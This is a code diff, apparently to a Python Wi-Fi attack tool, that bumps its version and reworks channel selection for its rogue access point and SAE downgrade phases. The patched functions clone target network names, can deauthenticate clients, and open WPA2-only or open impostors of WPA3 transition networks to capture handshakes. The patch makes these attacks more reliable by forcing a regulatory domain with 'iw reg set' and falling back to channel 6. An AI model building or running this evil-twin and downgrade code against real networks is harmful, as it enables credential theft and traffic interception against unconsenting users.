@@ -53,7 +53,7 @@ import struct
 import threading
 from http.server import BaseHTTPRequestHandler, HTTPServer
 
-VERSION = "1.7.4"
+VERSION = "1.7.5"
 
 
 def _clients_base() -> Path:
@@ -2574,7 +2574,7 @@ def _assign_ip_to_iface(iface: str, ip_cidr: str) -> bool:
         return False
 
 
-def _select_ap_channel(ap_iface: str, preferred: int) -> int:
+def _select_ap_channel(ap_iface: str, preferred: int) -> int | None:
     """Return a channel allowed for AP mode on ap_iface, nearest to preferred.
 
     Queries iw for the regulatory-allowed channel list on the interface's phy
@@ -2646,13 +2646,11 @@ def _select_ap_channel(ap_iface: str, preferred: int) -> int:
     _commit()
 
     if not allowed:
-        # iw parsing failed or adapter has no usable channels in its list.
-        # Hard-code a UNII-3 preference for 5 GHz as a last resort.
-        if preferred >= 36:
-            log(f"[~] _select_ap_channel: iw parse yielded no allowed channels "
-                f"for {ap_iface} — trying UNII-3 fallback (ch 149)")
-            return 149
-        return preferred
+        # iw parsing succeeded but every channel is blocked (e.g. world
+        # regdomain "00" marking all 5 GHz channels NO-IR).  Return None so
+        # callers can decide whether to set a regulatory domain and retry, or
+        # fall back to 2.4 GHz entirely.
+        return None
 
     if preferred in allowed:
         return preferred
@@ -2666,7 +2664,7 @@ def _select_ap_channel(ap_iface: str, preferred: int) -> int:
 
 def _write_hostapd_conf(ssid: str, bssid: str, channel: int,
                          encryption: str, psk: str, ap_iface: str,
-                         work_dir: Path) -> Path:
+                         work_dir: Path, country_code: str = "") -> Path:
     enc_up = (encryption or "").upper()
     if psk and ("WPA" in enc_up or "WPA2" in enc_up):
         security = (
@@ -2685,6 +2683,10 @@ def _write_hostapd_conf(ssid: str, bssid: str, channel: int,
     conf += f"ignore_broadcast_ssid=0\n"
     if bssid:
         conf += f"bssid={bssid}\n"
+    if country_code and ch >= 36:
+        conf += f"country_code={country_code}\n"
+        conf += "ieee80211d=1\n"
+        conf += "ieee80211h=1\n"
     conf += security
     conf_path = work_dir / "hostapd.conf"
     conf_path.write_text(conf, encoding="utf-8")
@@ -2850,8 +2852,16 @@ def phase_rogue_ap(monitor_iface: str, primary_iface: str, target_aps: list,
     deauth_cl   = rogue_cfg.get("deauth_clients", False)
     duration    = int(rogue_cfg.get("portal_duration", 180))
 
+    country = (rogue_cfg.get("country_code") or "US").strip().upper()
+    _run(["sudo", "iw", "reg", "set", country], timeout=5)
+    time.sleep(1)
+
     ap_channel = _select_ap_channel(ap_iface, channel)
-    if ap_channel != channel:
+    if ap_channel is None:
+        log(f"Phase 6: No allowed 5GHz channels on {ap_iface} after reg set {country!r} "
+            f"— falling back to 2.4GHz (ch 6)")
+        ap_channel = 6
+    elif ap_channel != channel:
         log(f"Phase 6: Channel {channel} not available for AP mode on {ap_iface} "
             f"(NO-IR/disabled) — using channel {ap_channel}")
 
@@ -2869,7 +2879,7 @@ def phase_rogue_ap(monitor_iface: str, primary_iface: str, target_aps: list,
     ha_conf = _write_hostapd_conf(
         ssid, bssid, ap_channel,
         "WPA2" if use_psk_ap else "OPEN", psk if use_psk_ap else "",
-        ap_iface, rogue_dir,
+        ap_iface, rogue_dir, country,
     )
     dm_conf = _write_dnsmasq_conf(ap_iface, rogue_dir)
 
@@ -3350,19 +3360,27 @@ def phase_sae_downgrade(monitor_iface: str, primary_iface: str,
     dg_dir = output_dir / "sae_downgrade"
     dg_dir.mkdir(exist_ok=True)
 
+    country = (rogue_cfg.get("country_code") or "US").strip().upper()
+    _run(["sudo", "iw", "reg", "set", country], timeout=5)
+    time.sleep(1)
+
     for ap in wpa3_transition:
         ssid       = ap.get("ssid", "")
         bssid      = ap.get("bssid", "")
         channel    = int(ap.get("channel") or 6)
         ap_channel = _select_ap_channel(ap_iface, channel)
-        if ap_channel != channel:
+        if ap_channel is None:
+            log(f"Phase 9: No allowed 5GHz channels on {ap_iface} after reg set {country!r} "
+                f"— falling back to 2.4GHz (ch 6)")
+            ap_channel = 6
+        elif ap_channel != channel:
             log(f"Phase 9: Channel {channel} not available for AP mode on {ap_iface} "
                 f"(NO-IR/disabled) — using channel {ap_channel}")
         log(f"Phase 9: WPA2-only rogue AP targeting {ssid!r} [{bssid}] (transition mode)")
 
         if not _assign_ip_to_iface(ap_iface, f"{_CAPTIVE_IP}/24"):
             continue
-        ha_conf = _write_hostapd_conf(ssid, "", ap_channel, "OPEN", "", ap_iface, dg_dir)
+        ha_conf = _write_hostapd_conf(ssid, "", ap_channel, "OPEN", "", ap_iface, dg_dir, country)
         dm_conf = _write_dnsmasq_conf(ap_iface, dg_dir)
 
         cap_file = dg_dir / f"sae_dg_{bssid.replace(':','')}.cap"
